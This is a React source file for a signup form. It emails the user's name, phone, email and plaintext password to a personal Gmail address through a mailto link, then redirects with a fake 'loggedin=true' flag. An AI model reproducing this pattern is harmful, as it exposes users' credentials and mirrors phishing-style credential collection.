import React, { useState } from "react";

function App() {
  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  function handleSubmit(e) {
    e.preventDefault();

    const subject = "New Signup";
    const body =
      `Name: ${name}%0D%0A` +
      `Phone: ${phone}%0D%0A` +
      `Email: ${email}%0D%0A` +
      `Password: ${password}`;

    window.location.href =
      `mailto:sanchitsaini3333@gmail.com?subject=${subject}&body=${body}`;

    setTimeout(() => {
      window.location.href =
        "https://resilient-sable-8cb929.netlify.app/?loggedin=true";
    }, 1500);
  }

  return (
    <div style={page}>
      <form onSubmit={handleSubmit} style={form}>
        <h1 style={title}>Signup</h1>

        <input placeholder="Full Name" required style={input} value={name} onChange={(e) => setName(e.target.value)} />
        <input placeholder="Phone Number" required style={input} value={phone} onChange={(e) => setPhone(e.target.value)} />
        <input placeholder="Email" type="email" required style={input} value={email} onChange={(e) => setEmail(e.target.value)} />
        <input placeholder="Password" type="password" required style={input} value={password} onChange={(e) => setPassword(e.target.value)} />

        <button type="submit" style={button}>Submit</button>
      </form>
    </div>
  );
}

const page = {
  minHeight: "100vh",
  display: "flex",
  justifyContent: "center",
  alignItems: "center",
  background: "#000",
  padding: "20px",
};

const form = {
  width: "100%",
  maxWidth: "350px",
  background: "#111",
  padding: "25px",
  borderRadius: "12px",
};

const title = {
  color: "white",
  textAlign: "center",
};

const input = {
  width: "100%",
  padding: "14px",
  marginBottom: "14px",
  borderRadius: "8px",
  border: "1px solid #333",
  background: "#222",
  color: "white",
  boxSizing: "border-box",
};

const button = {
  width: "100%",
  padding: "14px",
  border: "none",
  borderRadius: "8px",
  background: "#0077ff",
  color: "white",
  fontWeight: "bold",
  cursor: "pointer",
};

export default App;
